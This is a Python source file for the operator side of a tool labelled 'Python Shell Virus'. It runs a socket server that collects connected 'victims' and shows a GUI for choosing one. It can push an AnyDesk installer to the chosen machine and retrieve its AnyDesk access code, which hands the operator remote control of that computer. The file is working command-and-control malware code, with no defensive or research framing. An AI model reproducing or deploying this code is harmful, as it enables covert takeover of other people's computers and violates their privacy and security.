import socket
import os
import threading
import tkinter as tk
from tkinter import messagebox
from tkinter.messagebox import showerror, showinfo
from constants import *

victims = {}


def startServer():
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.bind((IP, PORT))
    soc.listen()


    while True:
        clientSoc, clientAddr = soc.accept()
        victims[clientAddr] = clientSoc
        print(f"{clientAddr} has been connected!")


def buildUI():
    """
    Builds the GUI of the program
    """
    
    print("Building UI...")

    window = tk.Tk()
    window.title("Python Shell Virus")

    # for scrolling vertically
    yscrollbar = tk.Scrollbar(window)
    yscrollbar.pack(side = tk.RIGHT, fill = tk.Y)

    # Headers Labels
    tk.Label(text="Welcome To The Python Virus Shell!").pack()
    tk.Label(text="What Would You Like To Do?").pack()


    # Opertaion list
    variable = tk.StringVar(window)
    variable.set(INSTALL_ANYDESK_COMMAND) # default value
    opertaionList = tk.OptionMenu(window, variable,  INSTALL_ANYDESK_COMMAND,  GET_CODE_COMMAND,  POWER_ON_ANYDESK,  POWER_OFF_ANYDESK)
    opertaionList.pack()

    # Victims list
    victims_list = tk.Listbox(window, selectmode = "single", 
                yscrollcommand = yscrollbar.set)
    # Widget expands horizontally and 
    # vertically by assigning both to
    # fill option
    victims_list.pack(padx = 10, pady = 10,
            expand = tk.YES, fill = "both")
    x = list(victims)
    
    for each_item in range(len(x)):
        victims_list.insert(tk.END, x[each_item])
        victims_list.itemconfig(each_item, bg = "lime")


    # Attach listbox to vertical scrollbar
    yscrollbar.config(command = victims_list.yview)

    # Start Button
    startBtn = tk.Button(
        text="Start!",
        command= lambda: startButtonOnClick(variable.get() ,victims_list.get(tk.ACTIVE)),
    )
    startBtn.pack()

    # Reload Button
    reloadBtn = tk.Button(
        text="Reload!",
        command= lambda : reloadWindow(window),
    )
    reloadBtn.pack()

    window.mainloop()


def reloadWindow(window):
    """
    Reloads the GUI of the program

    For example when a new victim is connected we want to rebuild our ui 
    becusae we have to add the new victim to the victims list
    """

    print("Reloading UI...")
    window.destroy()
    buildUI()

def startButtonOnClick(command, selectedVictim):
    
    if selectedVictim == '':
        tk.Tk().withdraw()  # TODO: check that becuase i saw this on the stackoverflow example
        showerror("Error", "Please choose a victim!")
        print("Please choose a victim!")
    else:
        processCommand(command, selectedVictim)


def processCommand(command, selectedVictim):
    victimSocket = victims[selectedVictim]

    sendCommand(victimSocket, command)

    if command == INSTALL_ANYDESK_COMMAND:
        installAnyDesk(victimSocket)

    elif command == GET_CODE_COMMAND:
        getCodeCommandHandler(victimSocket)

    elif command == POWER_ON_ANYDESK:
        powerOnAnyDesk(victimSocket)

    elif command == POWER_OFF_ANYDESK:
        powerOffAnyDesk(victimSocket)


def sendCommand(sock, command):

    code = 0

    if command == INSTALL_ANYDESK_COMMAND:
        code = INSTALL_ANYDESK_COMMAND_CODE

    elif command == GET_CODE_COMMAND:
        code = GET_CODE_COMMAND_CODE

    elif command == POWER_ON_ANYDESK:
        code = POWER_ON_ANYDESK_CODE

    elif command == POWER_OFF_ANYDESK:
        code = POWER_OFF_ANYDESK_CODE

    print(f"Sending command ({command}) ...")
    sock.send(socket.htonl(code).to_bytes(4, "big"))
    print("The Command has been sent ({command}) !")

def installAnyDesk(victimSocket):
    print("Sending the anydesk file...")

    fileSize = os.path.getsize(ANYDESK_FILE_PATH)
    victimSocket.send(socket.htonl(fileSize).to_bytes(4, "big"))

    with open(ANYDESK_FILE_PATH, 'rb') as anydeskFile:
        totalRead = 0
        read = 0

        while totalRead < fileSize:
            read = anydeskFile.read(1024)
            victimSocket.send(read)
            totalRead += len(read)

        
    print("The file has been sent!")
    print("Waiting for the victim to install anydesk and send us the code!")

    print("Trying get the code...")

    sendCommand(victimSocket, GET_CODE_COMMAND)
    code = _getCode(victimSocket)

    if code == ANYDESK_CODE_ERROR:
        print("There is no anydesk code!")
        showerror("Code error", "There is no anydesk code!")

    else:
        print(f"The victim anydesk code is {code}")
        showinfo("AnyDesk code", f"The victim anydesk code is {code}")
    

def getCodeCommandHandler(victimSocket):

    code = _getCode(victimSocket)

    if code == ANYDESK_CODE_ERROR:
        print("There is no anydesk code!")
        showerror("Code error", "There is no anydesk code!")

    else:
        print(f"The victim anydesk code is {code}")
        showinfo("AnyDesk code", f"The victim anydesk code is {code}")

    return code


def _getCode(victimSocket):

    return victimSocket.recv(9).decode()


def powerOnAnyDesk(victimSocket):
    print("Powering on...")
    print("AnyDesk will be powered on in a few seconds...")


def powerOffAnyDesk(victimSocket):
    print("Powering off...")
    print("AnyDesk will be powered off immediately...")
    

def main():
    threading.Thread(target=startServer).start()
    buildUI()    


if __name__ == "__main__":
    main()